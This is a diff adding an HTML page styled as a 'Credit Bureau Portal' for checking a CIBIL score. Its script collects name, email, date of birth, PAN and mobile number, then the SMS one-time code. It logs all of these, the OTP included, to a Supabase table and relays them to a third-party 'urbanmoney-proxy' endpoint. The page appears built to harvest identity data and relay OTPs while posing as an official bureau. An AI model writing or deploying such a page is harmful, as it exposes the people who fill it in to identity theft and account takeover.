@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Credit Bureau Portal</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+</head>
+<body class="bg-slate-950 min-h-screen flex items-center justify-center p-4 antialiased">
+
+    <div class="bg-white rounded-2xl shadow-2xl p-8 max-w-md w-full border border-slate-100 transition-all duration-300">
+        
+        <div id="formSection">
+            <div class="mb-6">
+                <h2 class="text-xl font-bold text-slate-800">Check Your CIBIL Score</h2>
+                <p class="text-xs text-slate-400 mt-1">Fill in your information to safely pull your real-time report.</p>
+            </div>
+            
+            <form id="intakeForm" class="space-y-4">
+                <div>
+                    <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-1">Full Name (As per PAN)</label>
+                    <input type="text" id="fullName" required class="w-full px-3 py-2 text-sm rounded-lg border border-slate-200 outline-none focus:border-indigo-500">
+                </div>
+                <div>
+                    <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-1">Email Address</label>
+                    <input type="email" id="email" required class="w-full px-3 py-2 text-sm rounded-lg border border-slate-200 outline-none focus:border-indigo-500">
+                </div>
+                <div class="grid grid-cols-2 gap-4">
+                    <div>
+                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-1">Date of Birth</label>
+                        <input type="date" id="dob" required class="w-full px-3 py-2 text-sm rounded-lg border border-slate-200 outline-none focus:border-indigo-500">
+                    </div>
+                    <div>
+                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-1">PAN Number</label>
+                        <input type="text" id="pan" required pattern="[A-Z]{5}[0-9]{4}[A-Z]{1}" class="w-full px-3 py-2 text-sm rounded-lg border border-slate-200 outline-none uppercase focus:border-indigo-500" placeholder="ABCDE1234F">
+                    </div>
+                </div>
+                <div>
+                    <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-1">Mobile Number</label>
+                    <input type="tel" id="mobile" required pattern="[6-9][0-9]{9}" class="w-full px-3 py-2 text-sm rounded-lg border border-slate-200 outline-none focus:border-indigo-500" placeholder="9876543210">
+                </div>
+                
+                <button type="submit" id="submitDataBtn" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-medium py-2.5 rounded-lg text-sm mt-2 transition cursor-pointer">
+                    Submit & Request OTP
+                </button>
+            </form>
+        </div>
+
+        <div id="otpSection" class="hidden text-center py-4">
+            <div class="w-12 h-12 bg-amber-50 text-amber-600 rounded-full flex items-center justify-center mx-auto mb-3 animate-pulse">
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+            </div>
+            <h3 class="text-lg font-bold text-slate-800">Verify Your Number</h3>
+            <p class="text-xs text-slate-400 mt-1">Your data has been submitted. Enter the secure SMS verification code sent to your mobile device below.</p>
+            
+            <form id="otpVerifyForm" class="mt-6 space-y-4">
+                <input type="text" id="otpCode" required maxlength="6" pattern="[0-9]{4,6}" placeholder="· · · · · ·" class="w-full text-center tracking-widest font-mono text-2xl px-3 py-2 rounded-lg border border-slate-200 outline-none focus:border-amber-500">
+                <button type="submit" id="submitOtpBtn" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-medium py-2.5 rounded-lg text-sm transition cursor-pointer">
+                    Verify OTP & Fetch CIBIL
+                </button>
+            </form>
+        </div>
+
+        <div id="successSection" class="hidden text-center py-6">
+            <div class="w-24 h-24 rounded-full bg-emerald-50 border-4 border-emerald-500 flex items-center justify-center mx-auto mb-4 text-emerald-600 font-black text-3xl" id="scoreValue">
+                ---
+            </div>
+            <h3 class="text-xl font-bold text-slate-800">Report Pulled Successfully</h3>
+            <p class="text-sm text-slate-400 mt-1">Transaction verified. Your official score is saved securely.</p>
+        </div>
+
+    </div>
+
+    <script>
+        // CONFIGURATION VARIABLES
+        // Replace these values with your actual Supabase Project Credentials before deploying
+        const SUPABASE_URL = "YOUR_SUPABASE_URL";
+        const SUPABASE_ANON_KEY = "YOUR_SUPABASE_ANON_KEY";
+        const EDGE_PROXY_URL = "YOUR_SUPABASE_EDGE_FUNCTION_URL/urbanmoney-proxy";
+
+        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+        let trackedRecordId = null;
+
+        // Stage 1: Form Intake
+        document.getElementById('intakeForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('submitDataBtn');
+            btn.disabled = true; btn.innerText = "Processing Details...";
+
+            const payload = {
+                full_name: document.getElementById('fullName').value,
+                email: document.getElementById('email').value,
+                dob: document.getElementById('dob').value,
+                pan: document.getElementById('pan').value.toUpperCase(),
+                mobile: document.getElementById('mobile').value
+            };
+
+            const { data, error } = await supabase.from('cibil_pipeline').insert([payload]).select();
+            if (error) { alert("Failed to log entry to database."); btn.disabled = false; return; }
+            trackedRecordId = data[0].id;
+
+            try {
+                const response = await fetch(`${EDGE_PROXY_URL}/submit-lead`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ record_id: trackedRecordId, ...payload })
+                });
+
+                if (response.ok) {
+                    document.getElementById('formSection').classList.add('hidden');
+                    document.getElementById('otpSection').classList.remove('hidden');
+                } else {
+                    alert("Partner portal rejected the configuration metrics.");
+                    btn.disabled = false;
+                }
+            } catch(err) {
+                alert("Network communication timeout error.");
+                btn.disabled = false;
+            }
+        });
+
+        // Stage 2: OTP Verification
+        document.getElementById('otpVerifyForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('submitOtpBtn');
+            const token = document.getElementById('otpCode').value;
+            btn.disabled = true; btn.innerText = "Authenticating String...";
+
+            await supabase.from('cibil_pipeline').update({ user_entered_otp: token, current_status: 'AWAITING_OTP' }).eq('id', trackedRecordId);
+
+            try {
+                const response = await fetch(`${EDGE_PROXY_URL}/confirm-otp`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ record_id: trackedRecordId, otp: token })
+                });
+                const dataOut = await response.json();
+
+                if (response.ok && dataOut.score) {
+                    await supabase.from('cibil_pipeline').update({ current_status: 'COMPLETED' }).eq('id', trackedRecordId);
+                    
+                    document.getElementById('otpSection').classList.add('hidden');
+                    document.getElementById('successSection').classList.remove('hidden');
+                    document.getElementById('scoreValue').innerText = dataOut.score;
+                } else {
+                    alert("Verification check failed. Invalid OTP code string returned.");
+                    btn.disabled = false;
+                }
+            } catch(err) {
+                alert("Error calling target validation servers.");
+                btn.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
